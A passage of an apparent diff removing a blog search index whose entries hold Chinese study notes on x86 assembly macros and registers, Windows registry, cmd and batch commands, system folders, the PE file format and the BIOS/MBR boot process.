-ECHO ‘xxxxxxxxxx’		;输出字符串xxxxxxxxxx
-</code></pre>
-<ul>
-<li>循环宏</li>
-</ul>
-<pre><code>WHILE(表达式):为真时执行
-REPEAT N:重复N次
-FOR A,&lt;A1,A2...&gt;:让A依次为A1,A2...
-FORC A,&lt;string&gt;:让A依次为&#39;s&#39;,&#39;t&#39;...
-</code></pre>
-<ul>
-<li>条件宏（可与LT小于，GT大于，EQ等于，NE不等于，LE小于等于，GE大于等于，搭配使用）</li>
-</ul>
-<pre><code>IFB/IFNB:空/非空，则允许汇编
-IFIDN/IFDIF a b:参数a和参数b 相等/不相等 则允许（区分大小写）
-IFIDNI/IFDIFI a b:上面类似但不区分大小写
-IFDIF/IFNDIF name:如果name已/未定义 则汇编
-IF,ENDIF,ELSE,ELSEIF:自己看
-EXITM:退出宏，且后面的宏语句都不能展开
-</code></pre>
-<ul>
-<li>特殊运算符</li>
-</ul>
-<pre><code>&#39;&amp;&#39; : 使“CX”通过“&amp;CX”变为CX
-&#39;&lt;&gt;&#39; : 传递宏参数时“a，0，0”为三个参数，“&lt;a,0,0&gt;”为一个参数
-&#39;!&#39; : &lt;xxxx5&gt;2&gt;,第一个‘&gt;’影响判断“&lt;xxxx5!&gt;2&gt;”则将其当做字符串的一部分
-&#39;%&#39; : 传递宏参数时，“%(5+2)”，是可行的，会自动运算，“5+2”不可行
-</code></pre>
-<h3 id="0x03-32位寄存器"><a href="#0x03-32位寄存器" class="headerlink" title="0x03.32位寄存器"></a>0x03.32位寄存器</h3><p>（1）<strong>8个通用寄存器</strong>（64位时前缀R，共16个通用reg）：</p>
-<ul>
-<li><p>EAX（常用于累加）EBX（内存寻址の基址寄存器）ECX（循环计数器）EDX（与除法乘法有关）</p>
-</li>
-<li><p>ESI、EDI（与bx&#x2F;bp搭配使用，遍历数组）ESP（指向栈顶）EBP（指向栈底）</p>
-<blockquote>
-<p>EBP与ESP总是指向堆栈段最上面的栈帧，也叫活动记录，用于向子函数传递参数</p>
-</blockquote>
-</li>
-</ul>
-<p>（2）<strong>6个段寄存器</strong>（指向大致方向）：</p>
-<ul>
-<li><p>CS（代码段寄存器）DS（数据段寄存器，与BX搭配）SS（堆栈段寄存器，与SP、BP搭配）</p>
-</li>
-<li><p>附加段寄存器—ES、FS、GS</p>
-</li>
-</ul>
-<p>（3）<strong>标志寄存器</strong>（EFLAGS）</p>
-<blockquote>
-<p>有32位，在64位模式下，由64位的RFLAGS取代，但是高32位不使用，各位用法不变</p>
-</blockquote>
-<ul>
-<li><p>CF—无符号进位标志位、OF—有符号溢出标志位</p>
-</li>
-<li><p>SF—符号标志位（正&#x3D;0）、ZF—零标志位（结果为0&#x3D;1）</p>
-</li>
-</ul>
-<p>（4）<strong>指令指针寄存器</strong>（EIP&#x2F;RIP）：指向下一条要执行的指令，与CS搭配食用</p>
-<p>（5）<strong>特殊寄存器</strong>：8个64位のMMX寄存器 + 8个128位的XMM寄存器，被用于SIMD（单指令多数据）指令体系中，多用于高级多媒体通信或用于FPU中（用于计算浮点数，现多集成于cpu中）；</p>
-<blockquote>
-<p>在64位模式下&#x3D;8个64位のMMX寄存器 + 16个128位的XMM寄存器 + 8个80位的浮点寄存器</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>系统安全</category>
-      </categories>
-      <tags>
-        <tag>汇编</tag>
-        <tag>x86</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows讲解</title>
-    <url>/2023/09/07/Windows%E4%B8%8D%E8%AE%B2%E5%86%85%E6%A0%B8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：涉及快捷方式、cmd命令、PE文件等windows相关内容</p>
-<span id="more"></span>
-
-<h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00.基础"></a>0x00.基础</h3><table>
-<thead>
-<tr>
-<th>快捷键</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>WIN+E、I、M、R、V、+&#x2F;-</td>
-<td>文件管理、设置、最小化(多个shift还原)、运行、剪切板、放大缩小</td>
-</tr>
-<tr>
-<td>CTRL+Z、Y、shift+Esc、Shift+N</td>
-<td>撤销、恢复、任务管理器、新建文件夹</td>
-</tr>
-<tr>
-<td>alt+F4、Enter</td>
-<td>关闭当前程序、查看文件属性</td>
-</tr>
-<tr>
-<td>Shift+delete</td>
-<td>永久删除，不在回收站</td>
-</tr>
-<tr>
-<td>F11</td>
-<td>全屏</td>
-</tr>
-</tbody></table>
-<p><strong>文件扩展</strong>：仅仅用来告诉程序如何打开该文件，并不会对文件内容有啥破坏。</p>
-<ol>
-<li><p>.inf文件即驱动的说明文件；驱动，即硬件驱动程序，是使硬件正常工作的一种软件；.inf文件里存放着关于驱动的适配厂商，版本号等信息</p>
-</li>
-<li><p>.sys文件，系统级驱动程序文件的可执行代码</p>
-</li>
-<li><p>.dll，动态链接库；.lib静态链接库</p>
-</li>
-<li><p>.bin，二进制文件</p>
-</li>
-<li><p>.ini文件即初始化文件；是windows系统配置文件采用的存储格式；类似功能还有.cfg、.conf、.tx*</p>
-<blockquote>
-<p>.ini文件由若干节（[xxxx]中括号包围）构成，每节都由若干键-值构成（abb&#x3D;xxxx），分号用于表示注释，直到行末；目前还存有少数.ini文件，大多都用注册表代替</p>
-</blockquote>
-</li>
-</ol>
-<p><strong>环境变量</strong>：简单来说就是告诉计算机，你这个程序在哪里，可以方便操作系统打开这个程序；包括用户变量和系统变量，用户变量指的就是操作系统对于当前用户（多用户）所能够快速操作的程序，系统变量就是该操作系统（多系统）可以快速打开的程序；</p>
-<p><strong>注册表</strong>：用来管理计算机的各个软硬件，包括控制面板、任务管理器、时间的改写、系统开机显示等偏向系统方向的内容，记录了用户安装在计算机上的软件和每个程序的相互关联信息，可以说是一种数据库；结构为：根键——项——值；</p>
-<ul>
-<li><p>根键：最大的文件夹，以HKEY为前缀，全大写</p>
-<table>
-<thead>
-<tr>
-<th>根键名称</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>HKEY_LOCAL_MACHINE</td>
-<td>与机器硬件有关部分</td>
-</tr>
-<tr>
-<td>HKEY_USERS</td>
-<td>包含了所有的用户（xxx1&amp;xxx2）的设置信息</td>
-</tr>
-<tr>
-<td>HKEY_CURRENT_USER</td>
-<td>当前用户的信息，从第二项中单独分离出来的</td>
-</tr>
-<tr>
-<td>HKEY_CLASSES_ROOT</td>
-<td>定义文件扩展名、类型、图标等;从H1\software\classes分离</td>
-</tr>
-<tr>
-<td>HKEY_CURRENT_CONFIG</td>
-<td>相关配置的驱动的加载；从H1\config中分离</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>项：小文件夹，除了大的文件夹都是项</p>
-</li>
-<li><p>值：包括三部分：值的名称—值的类型—值的数据</p>
-<table>
-<thead>
-<tr>
-<th>值类型</th>
-<th>具体</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>REG_SZ&#x2F;字符串值</td>
-<td>固定长度字符串</td>
-</tr>
-<tr>
-<td>REG_BINARY二进制值</td>
-<td>多数硬件组成信息存储</td>
-</tr>
-<tr>
-<td>DWORD&#x2F;QWORD</td>
-<td>数据的表示是4字节长&#x2F;8字节长，大多驱动参数为DWORD</td>
-</tr>
-<tr>
-<td>REG_MULTI_SZ多字符串值</td>
-<td>含有多个文本值的字符串</td>
-</tr>
-<tr>
-<td>REG_DWORD可扩充字符串值</td>
-<td>解析的变量？</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<h3 id="0x01-命令与批处理脚本"><a href="#0x01-命令与批处理脚本" class="headerlink" title="0x01.命令与批处理脚本"></a>0x01.命令与批处理脚本</h3><p>cmd是windows下模仿DOS操作系统（之前的磁盘操作系统）的程序，但受到windows的限制，即不可能删除windows文件，但在DOS系统下可以；cmd也可以叫做bat，用cmd编写的脚本类似于Linux下的shell脚本，dos或win下的这样批处理脚本后缀.bat或.cmd</p>
-<blockquote>
-<p>这里再另外介绍以下powrshell，部分命令与cmd相同，大部分命令进行更新，更换为更容易理解的动名词短语形式，此外cmd类似于解释器，而powrshell的相当于一门面向对象的语言，借助.net平台（和win集成）可以运行其他许多在.net平台上编写的程序，也可向下兼容cmd的批处理脚本</p>
-</blockquote>
-<h4 id="运行win-R键"><a href="#运行win-R键" class="headerlink" title="运行win+R键"></a>运行win+R键</h4><p>.cpl : 即Control Panel extension控制面板扩展程序</p>
-<p>.msc ：即Micosoft management Console微软管理控制台</p>
-<pre><code class="powershell">winver-------------------查看windows版本
-regedit------------------打开注册表编辑器
-firewall.cpl-------------防火墙
-mstsc--------------------远程桌面连接
-compmgmt.msc-------------计算机管理
-services.msc-------------服务管理
-optionalfeatures---------可选功能(如Hyper-V)
-appwiz.cpl---------------卸载更改程序
-shutdown-----------------关机
-certmgr.msc--------------证书管理
-control------------------打开控制面板
-appwiz.cpl---------------卸载部分软件
-</code></pre>
-<h4 id="cmd基本命令"><a href="#cmd基本命令" class="headerlink" title="cmd基本命令"></a>cmd基本命令</h4><pre><code class="powershell">help balabala(查询balabala命令的详细用法)
----------------目录----------------------------
-cd..(返回上一级)
-cd \(返回根目录)
-cd /d d:/test(切换到d盘的test文件夹，/d为参数)
-------------文件相关----------------------------
-dir(显示当前目录下文件夹)
-tree d:/test(树状列出)
-md test6(建立test6文件夹)
-rd test6(删除test6文件夹,需确认)  /s(非空时需要确认) /s/q(非空时不需要确认)
-copy/move  d:\test1  e:\test2(把test1文件夹复制/移动到test2文件夹下)
-del test5.pdf(专门删除文件，不是文件夹，不经常回收站)
-ren d:\test1  test4(重命名文件/文件夹)
-attrib--------------(设置文件属性)
-------------网络-------------------------------
-ping ip/域名(测试连通)   -n 5(测试五次)
-tracert ip/域名(路由追踪)
-ipconfig(查看本机ip)
-arp(用于显示连接在同一网段下的其他IP)
-------------进程-------------------------------
-tasklist(显示当前正在运行的进程)
-start xx.exe(开启某程序)
-taskkill /im xxx.exe(按照名称关闭进程)
-taskkill /pid 123456(按PID关闭进程)
-------------其他-------------------------------
-shutdown /s(关机) /r(重启) /h|f(休眠) /a(取消关机) /s /t 100(100s后关机)
-cls(清屏)
-F7(查看所有执行过的命令，左边会有编号)
-F9(搭配F7，按照编号选择命令)
-</code></pre>
-<h4 id="批处理脚本"><a href="#批处理脚本" class="headerlink" title="批处理脚本"></a>批处理脚本</h4><p>后缀文件保存为.bat，双击即可食用；至于脚本，是因为同样类似于解释型语言，一条条翻译运行；</p>
-<p>cmd窗口与python的交互窗口类似；当然下面所列的也可以在cmd窗口中直接运行；可以与正则表达式配合使用</p>
-<pre><code class="powershell">-------------条件循环-------
-if %a% equ %b% (echo yes) else (echo no)	#如果a=b..
-#exit(存在哪个文件)equ(相等);neq(不等);lss(小于);leq(小或等);gtr(大于);geq(大或等);
-for  %%I in (ABC) do echo %%I	#输出ABC
-#for %I in(内容1，内容2...) do command (在bat文件中用%%I)
-
-------------显示与变量设置---
-echo (显示当前回显状态)
-@echo off (从本行开始关闭回显，去掉@则从下行开始，on则打开，@负责单行的回显，一般作为文件开始)
-set a=aaa (设置变量a值为“aaa”，不要用%0~9)
-echo %a% (输出变量a的值)
-rem (注释)
-%0 %1.....%9 (第0-9个参数，%0表示自身，指的是在命令行中运行脚本时带的参数)
--------------其他----------
-title xxx (变更窗口标题)
-pause (暂停)
-&amp;(顺序执行多条命令，不管结果)
-&amp;&amp;(顺序执行，碰到错误命令后不再执行)
-||(顺序执行命令，碰到正确后不再执行)
-|  (管道符，后面的做前面的输入)
-&gt;(清除原本内容后再写入)
-&gt;&gt;(接着写)
-</code></pre>
-<h3 id="0x02-系统文件"><a href="#0x02-系统文件" class="headerlink" title="0x02.系统文件"></a>0x02.系统文件</h3><p>ps: $开头的一般均为临时文件；</p>
-<ol>
-<li>Windows：win系统文件</li>
-</ol>
-<ul>
-<li>addins：存放系统附加功能</li>
-<li>appcompat：应用兼容性相关</li>
-<li>apppath：保存程序的修补备份文件</li>
-<li>assembly：由.Net Framwork自动创建，包含多个托管模块以及一些资源文件的逻辑组合；</li>
-<li>boot：主要功能为一键备份所需，可删；另一个boot.ini为系统启动时的引导文件；</li>
-<li>Debug：系统层面的调试文件夹，存放调试日志.log</li>
-<li>Downloaded Program Files：存放过去的IE浏览器扩展，目前已空；可删；</li>
-<li>Help：Windows帮助文件；可扔；</li>
-<li>INF：存放 为硬件提供服务的.inf文件和.pnf文件；</li>
-<li>Microsoft.NET：.net根据官方文档，电脑的驱动以及系统更新需要此支持；</li>
-<li>Offline web pages：脱机浏览文件，即没网的时候仍可浏览的网页；</li>
-<li><strong>PLA</strong>：性能日志和警报，依据性能计数器阈值生成警报等；</li>
-<li>Prefetch：存放系统预读取过的信息，加快访问速率；可删内容；</li>
-<li><strong>security</strong>：系统重要的数据文件；</li>
-<li><strong>System32</strong>：存放64位的windows系统；<ul>
-<li>drivers：里面存放驱动程序文件的可执行代码.sys文件</li>
-</ul>
-</li>
-<li><strong>SysWOW64</strong>：是64位的windows用来存放32位windows的地方；</li>
-<li>TAPI：win升级时备份的旧版本文件；可删；</li>
-<li>TEMP：系统运行过程中的的临时文件夹；需清理；</li>
-<li>Templnst：存储部分应用的离线模板文件夹；</li>
-<li>Tracing：WindowsLiveMassage会创建的文件；现在没啥用；</li>
-<li>twain_32：实现扫描功能，需外接设备；没啥用；</li>
-<li><strong>WinSxS</strong>：存放不同版本的windows组件，减少dll引起的不同版本引用的问题</li>
-</ul>
-<ol start="2">
-<li><p>Program File：系统中64位软件的安装目录</p>
-</li>
-<li><p>Program File(x86)：系统中32位软件安装目录</p>
-</li>
-<li><p>Program Data：放置程序使用数据等</p>
-</li>
-<li><p>Users：存储系统所有用户的软件及数据等；包括桌面和开始菜单</p>
-<ul>
-<li>Default：存放创建新账户时的配置文件</li>
-<li>Lenovo：Lenovo用户的存储的数据内容（这里主要介绍其中AppDate里的内容）<ul>
-<li>Local：与安装的程序相关的文件夹，其中的数据不会因为用户的切换而无法显示</li>
-<li>LocalLow：低级别访问数据</li>
-<li>Roaming：可随着用户的配置而转移的数据</li>
-</ul>
-</li>
-<li>公用：所有用户可用文件夹</li>
-</ul>
-</li>
-<li><p>Intel：安装驱动时的文件夹，安装过后可扔</p>
-</li>
-</ol>
-<blockquote>
-<p> 下面是Windows文件夹下一些主题配置相关文件</p>
-<p>Cursors：鼠标指针，以.cur格式存放。en-US、zh-CN：语言文件夹。</p>
-<p>Fonts：字体文件。IME：存放系统默认的输入法。</p>
-<p>Media：系统提示音等。Resources：系统主题文件。Web：系统自带的图片壁纸</p>
-</blockquote>
-<h3 id="0x03-PE文件"><a href="#0x03-PE文件" class="headerlink" title="0x03.PE文件"></a>0x03.PE文件</h3><p>PE（Portable Executable），可移植的可执行文件。由COFF（UNIX下的通用对象文件格式）发展过来，对应Linux下的ELF文件；PE指的32位的可执行文件也叫PE32，对于64位的叫PE+或PE32+是一种扩展形式</p>
-<p>二进制下打开4D 5A开头对应ASCII码中的MZ，其后面不远就有PE，这些标志着PE文件的叫做PE指纹；整体结构：DOS首部—NT映像头—块表&#x2F;节表—块&#x2F;节</p>
-<blockquote>
-<p>详细概述见<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvZGVidWcvcGUtZm9ybWF0">PE 格式 - Win32 apps | Microsoft Learn<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>种类</th>
-<th>后缀</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>可执行系列</td>
-<td>.exe  &amp;&amp; .scr</td>
-</tr>
-<tr>
-<td>库系列</td>
-<td>.dll &amp;&amp; .ocx &amp;&amp; .cpl &amp;&amp; .drv</td>
-</tr>
-<tr>
-<td>驱动程序系列</td>
-<td>.sys  &amp;&amp; .vxd</td>
-</tr>
-<tr>
-<td>对象文件系列</td>
-<td>.obj</td>
-</tr>
-</tbody></table>
-<ul>
-<li><p>DOS部首：DOS MZ(4D 5A)文件头，DOS块共64字节，最低四字节，存放着PE的地址，在DOS MZ和PE头之间剩下的是DOS插桩程序。是一个在DOS环境下显示”This program can not be run in DOS mode”或”This program must be run under Win32”的小程序</p>
-</li>
-<li><p><strong>PE文件头&#x2F;NT映像头</strong>：4B+20B+224B；这里以32位做实例，存在于&lt;winnt.h&gt;头文件中，详情参考<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvYXBpL3dpbm50L25zLXdpbm50LWltYWdlX250X2hlYWRlcnMzMg==">Microsoft Learn<i class="fa fa-external-link-alt"></i></span></p>
-<pre><code class="c++">typedef struct _IMAGE_NT_HEADERS &#123;
-    DWORD Signature;		//字串，4B
-    IMAGE_FILE_HEADER FileHeader;		//映像文件头，20B
-    IMAGE_OPTIONAL_HEADER32 OptionalHeader;	//可选映像头，224B，64位下240B
-&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
-</code></pre>
-<ol>
-<li><p>字串：”50\45\00\00”&#x3D;”PE\0\0”标志着NT头的开始；在DOS程序头的3CH位置的四个字节，是前面字符串的偏移地址。</p>
-</li>
-<li><p>映像文件头（main）：</p>
-<pre><code class="c++">typedef struct _IMAGE_FILE_HEADER&#123;
-    WORD Machine		//机器类型,x86=14CH
-    WORD NumberOfSection		//文件中节的个数,important,每个节固定40字节
-    DWORD TimeDateStamp		//文件生成的时间戳
-    DWORD PointerToSymbolTable		//COFF符号表的偏移（用于调试）
-    DWORD NumberOfSymbols		//符号表中的符号数目（用于调试）
-    WORD SizeOfOptionalHeader		//可选头大小,important,用于寻找节表的开始位置
-    WORD Characteristics		//文件属性
-&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
-</code></pre>
-</li>
-<li><p>可选映像头：</p>
-<pre><code class="c++">typedef struct _IMAGE_OPTIONAL_HEADER &#123;
-  WORD Magic;		//幻数，一般是010BH
-  BYTE MajorLinkerVersion;		//连接程序的主版本号
-  BYTE MinorLinkerVersion;		//连接程序次版本号
-  DWORD SizeOfCode;		//代码段总尺寸-important-对齐后的值
-  DWORD SizeOfInitializedData;		//已初始化数据总尺寸
-  DWORD SizeOfUninitializedData;	//未初始化数据总尺寸
-  DWORD AddressOfEntryPoint;	//开始执行位置-important!!!
-  DWORD BaseOfCode;		//代码节开始位置-important
-  DWORD BaseOfData;		//数据节开始位置
-  DWORD ImageBase;		//可执行文件默认装入的基地址-如果装入时用该值做基地址则无需再重定位,EXE默认400000H，DLL默认10000000H
-  DWORD SectionAlignment;	//装入内存时节的对齐数字
-  DWORD FileAlignment;		//节的对齐数字，一般是扇区长（512B）
-  WORD MajorOperatingSystemVersion;		//要求最低的OS主版本号
-  WORD MinorOperatingSystemVersion;		//最低OS的次版本号
-  WORD MajorImageVersion;		//可执行文件主版本号
-  WORD MinorImageVersion;		//次版本号
-  WORD MajorSubsystemVersion;	//最小子系统主版本号
-  WORD MinorSubsystemVersion;	//最小子系统次版本号
-  DWORD Win32VersionValue;	//保留，一般0
-  DWORD SizeOfImage;		//装入内存后映像的总尺寸-SectionAlignment的整数倍
-  DWORD SizeOfHeaders;		//NT映像头+节表大小
-  DWORD CheckSum;		//CRC检验和，一般EXE为0，
-  WORD Subsystem;		//可执行文件的子系统
-  WORD DllCharacteristics;		//何时被DllMain调用
-  DWORD SizeOfStackReserve;		//初始化线程时保留的栈大小
-  DWORD SizeOfStackCommit;		//提交的栈大小
-  DWORD SizeOfHeapReserve;		//保留堆大小
-  DWORD SizeOfHeapCommit;		//提交堆大小
-  DWORD LoaderFlags;		//与调试有关
-  DWORD NumberOfRvaAndSizes;	//数据目录的项数，一般16
-  IMAGE_DATA_DIRECTORY 	DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];	//数据目录，存放该可执行文件上一些重要部分的起始RVA和尺寸
-&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
-</code></pre>
-</li>
-</ol>
-</li>
-<li><p>节表&#x2F;块表：用来说明节的具体信息，每个节都有一个节表，节表数量由映像文件头决定；一个节表40B；通俗版参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTQwNzk5Ni0xLTEuaHRtbA==">PE文件笔记六 节表和节<i class="fa fa-external-link-alt"></i></span></p>
-<blockquote>
-<p>VA：内存中虚拟地址；RVA：相对虚拟地址的偏移；FA：文件的地址；FOA：在文件中的偏移地址，没有被载入内存；VA &#x3D; RVA + ImageBase</p>
-</blockquote>
-<pre><code class="c++">typedef struct _IMAGE_SECTION_HEADER &#123;
-  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];		//8字节的节名，数组表示
-  union &#123;
-    DWORD PhysicalAddress;
-    DWORD VirtualSize;
-  &#125; Misc;		//obj文件用来表示本节物理地址，EXE文件中表示节的实际字节数
-  DWORD VirtualAddress;		//加载进内存后，本节的偏移地址地址
-  DWORD SizeOfRawData;		//未加载的文件在对齐后的节的尺寸
-  DWORD PointerToRawData;		//本节在原始文件中的偏移地址
-  DWORD PointerToRelocations;	//obj文件中表示该节重定位信息的偏移，EXE中无意义
-  DWORD PointerToLinenumbers;	//行号表位置
-  WORD  NumberOfRelocations;		//需要重定位的数目
-  WORD  NumberOfLinenumbers;		//在行号表中的行号数目
-  DWORD Characteristics;		//节属性-代码节=60000020h即可执行、可读、节中包含代码-数据节=C0000040h即可读、可写、包含已初始化数据
-&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
-</code></pre>
-<p>根据可执行文件获取每一节在内存中位置：</p>
-<ol>
-<li>读取<code>IMAGE_FILE_HEADER.NumberOfSection</code>，获取<strong>节</strong>数目</li>
-<li>读取<code>IMAGE_OPTIONAL_HEADER.SizeOfHeaders</code>来定位<strong>节表</strong>的位置</li>
-<li>对于每一节，首先读取<code>IMAGE_SECTION_HEADER.PointerToRawData</code>来得到该<strong>节</strong>在原始文件中的偏移地址—FOA，读取<code>IMAGE_SECTION_HEADER.SizeOfRawData</code>得到<strong>节</strong>在原始文件中的总字节数</li>
-<li>读取<code>IMAGE_OPTIONAL_HEADER.ImageBase</code>得到<strong>文件</strong>在内存中的基地址—ImageBase，之后读取<code>IMAGE_SECTION_HEADER.VirtualAddress</code>获得本<strong>节</strong>相对于文件的偏移地址—RVA，两者再相加获得本节的虚拟地址—VA，同时根据<code>IMAGE_SECTION_HEADER.Characteristics</code>获取节的具体属性</li>
-</ol>
-</li>
-<li><p>节数据：</p>
-<ol>
-<li><p>代码节.text或.code：PE文件均有，含有程序可执行代码</p>
-</li>
-<li><p>引出函数节.edata：一般在DLL中，本文件向其他文件提供的可调用函数列表</p>
-<pre><code class="c++">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;
-    DWORD   Characteristics;	//属性，一般为0
-    DWORD   TimeDateStamp;		//文件生成时间戳
-    WORD    MajorVersion;		//主版本号
-    WORD    MinorVersion;		//次版本号
-    DWORD   Name;		//指向的DLL名字
-    DWORD   Base;		//导出函数的起始序列号，与下面的序号y相加得到对应函数的导出序号
-    DWORD   NumberOfFunctions;		//所有导出函数的总数
-    DWORD   NumberOfNames;		//有名称的导出函数总数，都有序号
-    DWORD   AddressOfFunctions;     //指向函数地址数组，每个成员占4B，表示相应函数的RVA
-    DWORD   AddressOfNames;         //指向一个数组，里面装的是4B的地址，该地址下存放的是函数名字字符串，借此数组与我们需要的函数名称进行对比，我们可以找到目标的序号x
-    DWORD   AddressOfNameOrdinals;  //指向一个序号对应数组，由上面的序号x，查找得到需要的函数地址在AddressOfFunction中的序号y
-&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
-</code></pre>
-</li>
-<li><p>引入函数节.idata：<code>IMAGE_IMPORT_DESCRIPTOR</code>结构数组，每引入一个DLL，数组就多一项</p>
-<pre><code class="c++">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;
-    union &#123;
-        DWORD   Characteristics;
-        DWORD   OriginalFirstThunk;
-    &#125; DUMMYUNIONNAME;		//IMAGE_THUNK_DATA数组的指针，在文件中与FirstThunk指向一样，内存中不同
-    DWORD   TimeDateStamp;		//文件建立时间戳
-    DWORD   ForwarderChain;		//引用的DLL的API，又引用了其他DLL的API，现在一般为0
-    DWORD   Name;		//指向的DLL名字
-    DWORD   FirstThunk;		//通常是一个RVA，指向IMAGE_THUNK_DATA结构（该结构说明函数的导入方式）
-&#125; IMAGE_IMPORT_DESCRIPTOR;
-typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
-</code></pre>
-<pre><code class="c++">typedef struct _IMAGE_THUNK_DATA32 &#123;
-    union &#123;
-        DWORD ForwarderString;      // PBYTE 
-        DWORD Function;             // PDWORD
-        DWORD Ordinal;
-        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME
-    &#125; u1;//双字最高位是1时，函数是以序号形式导入的，此时的低位就是函数序号
-    //最高位是0时，函数以字符串形式导入，此时双字=RVA地址，指向一个IMAGE_IMPORT_BY_NAME
-&#125; IMAGE_THUNK_DATA32;
-typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;
-
-typedef struct _IMAGE_IMPORT_BY_NAME &#123;
-    WORD    Hint;		//表示函数的序号
-    CHAR   Name[1];		//导入函数的名称字符串
-&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
-</code></pre>
-</li>
-<li><p>已初始化数据节.data：编译时已经固定值的数据</p>
-</li>
-<li><p>未初始化数据节.bss：未初始化的全局变量和静态变量</p>
-</li>
-<li><p>资源节.rsrc或.rdata：程序要用到的资源，树形结构</p>
-</li>
-<li><p>重定位信息段.reloc：存放重定位信息</p>
-<pre><code class="c++">typedef struct _IMAGE_BASE_RELOCATION &#123;
-    DWORD   VirtualAddress;		//重定位数据开始的RVA地址
-    DWORD   SizeOfBlock;		//重定位块大小
-//  WORD    TypeOffset[1];		//重定向位数组，即地址偏移，大小不定
-&#125; IMAGE_BASE_RELOCATION;
-typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
-</code></pre>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="0x04-Win引导"><a href="#0x04-Win引导" class="headerlink" title="0x04.Win引导"></a>0x04.Win引导</h3><p>首先了解各大致过程：电源开启—&gt;分区引导（MBR）—&gt;操作系统引导（NTLDR&#x2F;Bootmgr）—&gt;文件系统引导（DBR）；下面的介绍均以windows为例子</p>
-<p><strong>硬盘结构</strong>：</p>
-<ul>
-<li><p>CHS寻址：借助3D参数，磁头0-255、柱面0-1023、扇区1-63</p>
-<blockquote>
-<p>3D参数：磁头数head（8位）、柱面数&#x2F;磁道号cylinders（10位）、扇区数sectors（6位，每个扇区512字节）</p>
-</blockquote>
-</li>
-<li><p>Int 13H调用：BIOS提供的基本功能，用于磁盘的复位、读写、校验、定位、诊断、格式化等，使用上述CHS寻址；</p>
-</li>
-<li><p>LBA寻址：将所有的扇区统一编号，从0开始；该地址为线性地址，由地址翻译器（硬件）将前面所述物理地址转换到此；同时也扩展了Int 13H，将其8G的限制突破</p>
-<blockquote>
-<p>LBA地址&#x3D;当前柱面号×255×63+当前磁头号×63+（当前扇区数-1）；因为不存在C&#x2F;H&#x2F;S&#x3D;0&#x2F;0&#x2F;0，所以最后减一</p>
-</blockquote>
-</li>
-</ul>
-<hr>
-<p><strong>Legacy BIOS引导模式</strong>：</p>
-<p>使用MBR磁盘格式，系统只能在MBR格式磁盘上；这里以win的启动为例；过程如下：</p>
-<ol>
-<li><p>通电电压不稳，主板发送RESET信号给CPU，稳定后不在发送。CPU执行0xFFFF0h处指令，此处为BIOS程序</p>
-</li>
-<li><p>BIOS执行，进行POST（加电自检）木有问题后加载第一个扇区（MBR）到内存0x7c00h处</p>
-</li>
-<li><p>执行MBR，查找第一个活动分区，并将其第一个扇区（PBR）加载到内存</p>
-</li>
-<li><p>执行PBR，跳过BPB到可执行代码处NTLDR</p>
-<blockquote>
-<p>BPB:即BIOS参数记录块，描述能够使可执行引导代码找到相关参数的信息。记录着本分区的起始扇区、结束扇区、文件存储格式、硬盘介质描述符、根目录大小、FAT 个数,分配单元的大小等重要参数。</p>
-</blockquote>
-</li>
-<li><p>PBR读取VBR（卷引导记录，用于告诉计算机OS在分区里的位置）；CPU跳转执行bootmgr代码</p>
-</li>
-<li><p>寻找BootMGR，木有则寻找ntldr（在win 8之后默认bootmgr）</p>
-</li>
-<li><p>执行bootmgr，读取BCD文件，如果有多个系统则列举供选择</p>
-</li>
-<li><p>选择win则加载winload.exe到内存，CPU执行，并读取\windows\bootstat.dat；接着加载内核程序Ntoskrnl.exe，将CPU执行权交给内核</p>
-</li>
-<li><p>内核程序初始化完成</p>
-</li>
-</ol>
-<p><strong>MBR分区模式</strong>：</p>
-<p>包括：主引导记录MBR（开机必读）、硬盘主分区表DPT、引导扇区标记boot record ID；</p>
-<ul>
-<li><p>MBR：占前446字节，存放着系统主引导程序，位于磁盘0柱面、0磁头、1扇区</p>
-</li>
-<li><p>DPT：占64字节，记录磁盘基本分区，一共包含4个分区项，每项16字节；</p>
-<blockquote>
-<p>1B分区状态—3B起始磁头号+起始扇区+柱面号—1B分区类型（识别主分区还是扩展分区）—3B分区结束磁头号+扇区+柱面号—1D本分区之前已经占用的扇区数—1D本分区占用总扇区数</p>
-</blockquote>
-</li>
